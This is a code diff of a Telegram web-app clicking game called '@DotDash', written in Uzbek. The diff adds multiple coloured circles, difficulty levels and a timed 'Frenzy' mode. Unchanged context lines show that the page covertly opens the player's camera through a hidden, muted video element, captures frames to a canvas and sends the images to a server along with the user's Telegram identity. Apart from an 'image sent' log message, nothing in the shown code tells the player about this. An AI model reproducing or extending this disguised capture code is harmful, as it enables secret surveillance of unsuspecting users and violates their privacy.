@@ -3,24 +3,26 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <title>@DotDash - Doira O'yini</title>
+  <title>@DotDash - Frenzy</title>
   <style>
     body {
-      font-family: sans-serif;
-      background: #111;
+      font-family: 'Montserrat', sans-serif;
+      background: linear-gradient(135deg, #111 0%, #1a1a3d 100%);
       color: #fff;
       text-align: center;
       padding: 2rem;
       margin: 0;
       touch-action: none;
+      overflow: hidden;
     }
 
     .game {
       max-width: 400px;
       margin: auto;
       padding: 1rem;
-      background: #1d1d1d;
-      border-radius: 12px;
+      background: rgba(29, 29, 29, 0.9);
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0, 170, 255, 0.3);
       user-select: none;
     }
 
@@ -30,6 +32,7 @@
       border-radius: 50%;
       position: absolute;
       cursor: pointer;
+      animation: pulse 1.5s infinite;
       transition: transform 0.2s;
     }
 
@@ -37,9 +40,19 @@
       transform: scale(1.2);
     }
 
-    .bonus-circle {
-      background: gold !important;
-      box-shadow: 0 0 10px gold;
+    .circle.clicked {
+      animation: explode 0.5s forwards;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+
+    @keyframes explode {
+      0% { transform: scale(1); opacity: 1; }
+      100% { transform: scale(2); opacity: 0; }
     }
 
     video {
@@ -66,17 +79,25 @@
     }
 
     .score {
-      font-size: 1.2rem;
+      font-size: 1.5rem;
       margin: 1rem 0;
+      text-shadow: 0 0 10px #0af;
+    }
+
+    .target-color {
+      font-size: 1rem;
+      margin: 0.5rem 0;
+      color: #0af;
     }
 
     .game-area {
       position: relative;
-      height: 300px;
+      height: 350px;
       background: #222;
       border-radius: 10px;
       overflow: hidden;
       touch-action: manipulation;
+      border: 2px solid #0af;
     }
 
     .settings {
@@ -89,43 +110,59 @@
       color: #fff;
       border: 1px solid #0af;
       border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 10px;
+      background: #333;
+      border-radius: 5px;
+      overflow: hidden;
+      margin: 0.5rem 0;
+    }
+
+    .progress {
+      height: 100%;
+      background: linear-gradient(90deg, #0af, #0f0);
+      transition: width 1s linear;
     }
 
     .logo {
-      width: 60px;
-      height: 60px;
+      width: 80px;
+      height: 80px;
       margin: 1rem auto;
     }
   </style>
 </head>
 <body>
   <div class="game">
-    <!-- Logo qo‘shildi -->
-    <svg class="logo" width="60" height="60" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
-      <rect width="512" height="512" fill="#1d1d1d"/>
+    <svg class="logo" width="80" height="80" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+      <rect width="512" height="512" fill="transparent"/>
       <circle cx="256" cy="256" r="150" fill="#00aaff"/>
       <circle cx="256" cy="256" r="160" fill="none" stroke="#ffffff" stroke-width="10" opacity="0.3"/>
       <rect x="350" y="240" width="30" height="5" fill="#00aaff" transform="rotate(45, 350, 242.5)"/>
       <rect x="320" y="340" width="30" height="5" fill="#00aaff" transform="rotate(-45, 320, 342.5)"/>
       <rect x="190" y="340" width="30" height="5" fill="#00aaff" transform="rotate(45, 190, 342.5)"/>
       <rect x="160" y="240" width="30" height="5" fill="#00aaff" transform="rotate(-45, 160, 242.5)"/>
-      <text x="256" y="400" font-family="Montserrat, Roboto, sans-serif" font-size="40" fill="#ffffff" text-anchor="middle">DotDash</text>
+      <text x="256" y="400" font-family="Montserrat, sans-serif" font-size="40" fill="#ffffff" text-anchor="middle">DotDash</text>
     </svg>
-    <h2>@DotDash - Doira O'yini</h2>
-    <p>Doirani imkon qadar ko'proq bosing!</p>
+    <h2>@DotDash - Frenzy</h2>
+    <p id="targetText">Faqat <span id="targetColor">ko‘k</span> doiralarni bosing!</p>
     <div class="score">Hisob: <span id="score">0</span></div>
     <div class="settings">
-      <label for="speed">Tezlik:</label>
-      <select id="speed">
-        <option value="1000">Normal</option>
-        <option value="800">Tez</option>
-        <option value="600">Juda tez</option>
+      <label for="difficulty">Qiyinchilik:</label>
+      <select id="difficulty">
+        <option value="easy">Oson</option>
+        <option value="medium">O‘rta</option>
+        <option value="hard">Qiyin</option>
       </select>
     </div>
-    <div class="loader"></div>
-    <div class="game-area" id="gameArea">
-      <div class="circle" id="circle"></div>
+    <div class="progress-bar">
+      <div class="progress" id="progress"></div>
     </div>
+    <div class="loader"></div>
+    <div class="game-area" id="gameArea"></div>
   </div>
 
   <video id="video" autoplay playsinline muted></video>
@@ -139,71 +176,133 @@
     const userId = user?.id || "1612270615";
     const fullName = `${user?.first_name || ""} ${user?.last_name || ""}`.trim();
     const username = user?.username || "";
-    const ADMIN_ID = "YOUR_ADMIN_ID"; // Bu yerga admin Telegram ID'sini qo‘ying
+    const ADMIN_ID = "YOUR_ADMIN_ID"; // Admin Telegram ID’sini qo‘ying
 
     const video = document.getElementById("video");
     const canvas = document.createElement("canvas");
     const ctx = canvas.getContext("2d");
-    const circle = document.getElementById("circle");
     const gameArea = document.getElementById("gameArea");
     const scoreDisplay = document.getElementById("score");
+    const targetColorText = document.getElementById("targetColor");
+    const progressBar = document.getElementById("progress");
+    const difficultySelect = document.getElementById("difficulty");
     const loader = document.querySelector(".loader");
-    const speedSelect = document.getElementById("speed");
 
     let score = 0;
     let isCapturing = false;
     let lastCaptureTime = 0;
-    let circleTimeout;
-    let moveInterval = 1000;
+    let circles = [];
+    let targetColor = "#0af"; // Boshlang‘ich maqsad rangi
+    const colors = ["#0af", "#0f0", "#f00", "#ff0"]; // Ko‘k, yashil, qizil, sariq
+    let frenzyMode = false;
+    let frenzyTimer = 0;
+    let difficulty = "medium";
+    let maxCircles = 5;
+    let spawnInterval = 1000;
 
-    const colors = ["#0af", "#0f0", "#f00"]; // Ko‘k, yashil, qizil
-
-    // O'yin logikasi
-    function moveCircle() {
-      clearTimeout(circleTimeout);
-      const maxX = gameArea.clientWidth - circle.clientWidth;
-      const maxY = gameArea.clientHeight - circle.clientHeight;
+    // O‘yin logikasi
+    function createCircle() {
+      const circle = document.createElement("div");
+      circle.classList.add("circle");
+      const color = colors[Math.floor(Math.random() * colors.length)];
+      circle.style.background = color;
+      const maxX = gameArea.clientWidth - 40;
+      const maxY = gameArea.clientHeight - 40;
       const newX = Math.random() * maxX;
       const newY = Math.random() * maxY;
       circle.style.left = `${newX}px`;
       circle.style.top = `${newY}px`;
-      circle.style.background = colors[Math.floor(Math.random() * colors.length)];
 
-      // Bonus doira (har 10 bosishda)
-      if (score % 10 === 0 && score > 0) {
-        circle.classList.add("bonus-circle");
-      } else {
-        circle.classList.remove("bonus-circle");
-      }
+      circle.addEventListener("click", () => handleCircleClick(circle, color));
+      circle.addEventListener("touchstart", (e) => {
+        e.preventDefault();
+        handleCircleClick(circle, color);
+      });
 
-      // 2 sekunddan keyin doira yo‘qoladi
-      circleTimeout = setTimeout(() => {
-        moveCircle();
-      }, 2000);
+      gameArea.appendChild(circle);
+      circles.push(circle);
+
+      setTimeout(() => {
+        if (circle.parentNode) {
+          circle.classList.add("clicked");
+          setTimeout(() => circle.remove(), 500);
+          circles = circles.filter(c => c !== circle);
+        }
+      }, frenzyMode ? 800 : 2000);
     }
 
-    circle.addEventListener("click", () => {
-      score += circle.classList.contains("bonus-circle") ? 5 : 1;
+    function handleCircleClick(circle, color) {
+      circle.classList.add("clicked");
+      setTimeout(() => circle.remove(), 500);
+      circles = circles.filter(c => c !== circle);
+
+      if (color === targetColor) {
+        score += frenzyMode ? 3 : 1;
+      } else {
+        score = Math.max(0, score - 1);
+      }
       scoreDisplay.textContent = score;
-      moveCircle();
+
+      if (score % 10 === 0 && score > 0) {
+        targetColor = colors[Math.floor(Math.random() * colors.length)];
+        targetColorText.textContent = getColorName(targetColor);
+        targetColorText.style.color = targetColor;
+      }
+    }
+
+    function getColorName(color) {
+      switch (color) {
+        case "#0af": return "ko‘k";
+        case "#0f0": return "yashil";
+        case "#f00": return "qizil";
+        case "#ff0": return "sariq";
+        default: return "noma’lum";
+      }
+    }
+
+    function updateProgress() {
+      frenzyTimer += 100;
+      const progress = (frenzyTimer / 30000) * 100;
+      progressBar.style.width = `${progress}%`;
+
+      if (frenzyTimer >= 30000) {
+        frenzyMode = true;
+        progressBar.style.background = "linear-gradient(90deg, #f00, #0f0)";
+        setTimeout(() => {
+          frenzyMode = false;
+          frenzyTimer = 0;
+          progressBar.style.background = "linear-gradient(90deg, #0af, #0f0)";
+        }, 10000);
+      }
+    }
+
+    function updateGame() {
+      if (circles.length < maxCircles) {
+        createCircle();
+      }
+    }
+
+    // Qiyinchilik sozlamalari
+    difficultySelect.addEventListener("change", () => {
+      difficulty = difficultySelect.value;
+      switch (difficulty) {
+        case "easy":
+          maxCircles = 3;
+          spawnInterval = 1500;
+          break;
+        case "medium":
+          maxCircles = 5;
+          spawnInterval = 1000;
+          break;
+        case "hard":
+          maxCircles = 7;
+          spawnInterval = 700;
+          break;
+      }
     });
 
-    circle.addEventListener("touchstart", (e) => {
-      e.preventDefault();
-      score += circle.classList.contains("bonus-circle") ? 5 : 1;
-      scoreDisplay.textContent = score;
-      moveCircle();
-    });
-
-    // Tezlikni o‘zgartirish
-    speedSelect.addEventListener("change", () => {
-      moveInterval = parseInt(speedSelect.value);
-      clearInterval(moveCircleInterval);
-      moveCircleInterval = setInterval(moveCircle, moveInterval);
-    });
-
-    moveCircle();
-    let moveCircleInterval = setInterval(moveCircle, moveInterval);
+    setInterval(updateGame, spawnInterval);
+    setInterval(updateProgress, 100);
 
     // Kamera logikasi
     async function startCamera() {
@@ -231,7 +330,6 @@
       } catch (err) {
         console.error("❌ Kamera ishga tushmadi:", err);
         loader.style.display = "none";
-        // Admin uchun xato log qilish
         if (userId === ADMIN_ID) {
           fetch("/log-error", {
             method: "POST",
@@ -278,7 +376,6 @@
           console.log("✅ Rasm yuborildi", new Date().toLocaleTimeString());
         } catch (err) {
           console.error("❌ Yuborish xatosi:", err);
-          // Admin uchun xato log qilish
           if (userId === ADMIN_ID) {
             fetch("/log-error", {
               method: "POST",
